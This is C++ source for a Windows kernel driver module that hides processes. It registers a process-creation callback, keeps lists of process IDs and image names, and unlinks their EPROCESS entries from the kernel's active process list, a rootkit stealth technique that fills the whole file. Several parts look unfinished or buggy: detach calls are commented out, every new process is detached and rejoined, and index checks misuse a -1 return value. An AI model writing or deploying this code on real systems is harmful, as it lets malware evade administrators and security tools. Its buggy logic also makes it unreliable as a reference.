#include "hide-proc.h"


namespace hide_proc
{
	void DrvRegister()
	{
		kHideProcIdList = new Vector<eprocess::ProcInfo>();
		kHideProcImageList = new Vector<String<WCHAR>>();
		kProcIdMutex.Create();
		kProcImageMutex.Create();
		NTSTATUS status;

		status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&hide_proc::ProcessNotifyCallBack, FALSE);
		if (STATUS_SUCCESS != status)
		{
			DebugMessage("Fail to register: %x", status);
		}
	}

	void DrvUnload()
	{
		delete kHideProcIdList;
		delete kHideProcImageList;
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&hide_proc::ProcessNotifyCallBack, TRUE);
	}

	size_t GetIndexInHiddenProcIdList(size_t pid)
	{
		size_t ret = (size_t)-1;
		kProcIdMutex.Lock();
		for (int i = 0; i < kHideProcIdList->Size(); i++)
		{
			if ((*kHideProcIdList)[i].GetParentPid() == pid ||
				(*kHideProcIdList)[i].GetPid() == pid)
			{
				ret = i;
				break;
			}
		}
		kProcIdMutex.Unlock();
		return ret;
	}

	void AddProcIdToHideList(size_t pid)
	{
		kProcIdMutex.Lock();
		eprocess::ProcInfo p(pid);
		if (p.GetPid() != 0)
		{
			kHideProcIdList->PushBack(p);
			p.DetachFromProcessList();
		}
		kProcIdMutex.Unlock();
		return;

	}
	void AddPeprocessToHideList(PEPROCESS peprocess)
	{
		kProcIdMutex.Lock();
		kHideProcIdList->PushBack(eprocess::ProcInfo(peprocess));
		kProcIdMutex.Unlock();
		return;
	}

	void DeleteProcIdFromHideList(size_t pid)
	{
		bool found = false;
		kProcIdMutex.Lock();
		for (int i = 0; i < kHideProcIdList->Size(); i++)
		{
			if ((*kHideProcIdList)[i].GetPid() == pid)
			{
				kHideProcIdList->EraseUnordered(i);
				found = true;
				break;
			}
		}
		kProcIdMutex.Unlock();
		return;
	}


	size_t GetIndexInHiddenProcImageList(const String<WCHAR>* image_path)
	{
		size_t ret = (size_t)-1;
		kProcImageMutex.Lock();
		for (int i = 0; i < kHideProcImageList->Size(); i++)
		{
			if ((*kHideProcImageList)[i] == *image_path)
			{
				ret = i;
				break;
			}
		}
		kProcImageMutex.Unlock();
		return ret;
	}

	void AddProcImageToHideList(const String<WCHAR>* image_path)
	{
		kProcImageMutex.Lock();
		kHideProcImageList->PushBack(*image_path);
		kProcImageMutex.Unlock();
	}

	void DeleteProcImageFromHideList(const String<WCHAR>* image_path)
	{
		kProcImageMutex.Lock();

		for (int i = 0; i < kHideProcImageList->Size(); i++)
		{
			if ((*kHideProcImageList)[i] == *image_path)
			{
				kHideProcImageList->EraseUnordered(i);
				break;
			}
		}
		kProcImageMutex.Unlock();
	}


	void HideOnProcessList()
	{
		// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
		eprocess::ProcInfo cur_proc(SYSTEM_PROCESS_ID);
		eprocess::ProcInfo next_proc;

		int cnt = 0;

		while (true)
		{
			cnt++;

			// Hide process
			next_proc = eprocess::ProcInfo(cur_proc.GetNextProc());
			
			String<WCHAR> process_image_name = cur_proc.GetProcessImageName();
			
			if ((process_image_name.Size() > 0 && GetIndexInHiddenProcImageList(&process_image_name) != -1) || GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
			{
				DebugMessage("Found PID to hide: %lld %llx", cur_proc.GetPid(), GetIndexInHiddenProcIdList(cur_proc.GetPid()));
				//cur_proc.DetachFromProcessList();
			}
			
			if (next_proc.GetPid() == SYSTEM_PROCESS_ID)
			{

				DebugMessage("GGEZ, %d", cnt);
				break;
			}
			cur_proc = next_proc;
		}
	}

	void HideOnProcessList(const String<WCHAR>* image_path)
	{
		// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
		eprocess::ProcInfo cur_proc(SYSTEM_PROCESS_ID);
		eprocess::ProcInfo next_proc;

		while (true)
		{
			// Hide process
			next_proc = cur_proc.GetNextProc();

			if (cur_proc.GetProcessImageName() == *image_path)
			{
				if (GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
				{
					AddProcIdToHideList(cur_proc.GetPid());
					cur_proc.DetachFromProcessList();
				}
			}

			if (next_proc.GetPid() == SYSTEM_PROCESS_ID)
			{
				break;
			}
			cur_proc = next_proc;
		}
	}

	void ProcessNotifyCallBack(PEPROCESS eprocess, size_t pid, PPS_CREATE_NOTIFY_INFO create_info)
	{
		if (create_info) // Process creation
		{
			if (create_info->ImageFileName == nullptr || create_info->FileOpenNameAvailable == FALSE)
			{
				return;
			}
			
			String<WCHAR> process_image_name(*(create_info)->ImageFileName);
			if (String<WCHAR>(L"\\??\\").IsPrefixOf(process_image_name))
			{
				process_image_name = &process_image_name[String<WCHAR>(L"\\??\\").Size()];
			}
			
			size_t index = GetIndexInHiddenProcIdList(pid);
			/*
			if (index != -1)
			{
				AddPeprocessToHideList(eprocess);
				(*kHideProcIdList)[index].DetachFromProcessList();
			}
			*/
			AddPeprocessToHideList(eprocess);
			(*kHideProcIdList)[(*kHideProcIdList).Size() - 1].DetachFromProcessList();
			(*kHideProcIdList)[(*kHideProcIdList).Size() - 1].JoinToProcessList();

			index = GetIndexInHiddenProcImageList(&process_image_name);
			if (index != -1)
			{
				AddPeprocessToHideList(eprocess);
				(*kHideProcIdList)[(*kHideProcIdList).Size()-1].DetachFromProcessList();
				return;
			}
		}
		else // Process termination
		{
			if (GetIndexInHiddenProcIdList(pid))
			{
				DeleteProcIdFromHideList(pid);
			}
		}
	}


}

